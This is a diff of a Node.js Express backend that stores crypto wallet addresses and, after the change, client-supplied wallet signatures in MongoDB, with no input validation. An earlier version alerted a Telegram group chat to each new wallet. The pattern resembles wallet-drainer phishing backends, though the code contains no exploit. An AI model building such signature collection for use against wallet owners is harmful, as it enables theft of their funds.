@@ -4,56 +4,44 @@ const mongoose = require("mongoose");
 const TelegramBot = require("node-telegram-bot-api");
 const path = require("path");
 
-const Wallet = require("../models/Wallet"); // import Wallet model
+const Wallet = require("../models/Wallet");
 
 const app = express();
 app.use(express.json());
-app.use(express.static(path.join(__dirname, "../public"))); // serve frontend
-
-// Debug env
-console.log("BOT_TOKEN loaded:", !!process.env.BOT_TOKEN);
-console.log("GROUP_CHAT_ID:", process.env.GROUP_CHAT_ID);
-console.log("MONGO_URI loaded:", !!process.env.MONGO_URI);
+app.use(express.static(path.join(__dirname, "../public")));
 
 // Connect MongoDB
 mongoose.connect(process.env.MONGO_URI)
   .then(() => console.log("MongoDB connected"))
-  .catch(err => console.error("Mongo error:", err));
+  .catch(err => console.error("MongoDB connection error:", err));
 
 // Telegram bot
+if (!process.env.BOT_TOKEN) {
+  console.warn("❌ Telegram Bot Token not provided!");
+}
 const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
 
 bot.on("message", (msg) => {
   console.log("Message from Telegram:", msg.text);
 });
 
-bot.sendMessage(
-  process.env.GROUP_CHAT_ID,
-  "✅ Bot is LIVE and connected successfully!"
-).catch(err => console.error("Telegram send error:", err.message));
-
-// API endpoint to save wallet address
+// API endpoint to save wallet info
 app.post("/api/wallet-connect", async (req, res) => {
+  const { address, signature } = req.body;
   try {
-    const { address } = req.body;
-    if (!address) return res.status(400).json({ error: "No wallet address" });
-
-    const exists = await Wallet.findOne({ address });
-    if (!exists) {
-      await Wallet.create({ address });
-      await bot.sendMessage(
-        process.env.GROUP_CHAT_ID,
-        `🟢 New Wallet Connected: ${address}`
-      );
-    }
-
+    const wallet = new Wallet({ address, signature });
+    await wallet.save();
     res.json({ success: true });
   } catch (err) {
     console.error(err);
-    res.status(500).json({ error: "Server error" });
+    res.json({ success: false });
   }
 });
 
-// Start server
+// Serve front-end
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "../public/index.html"));
+});
+
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
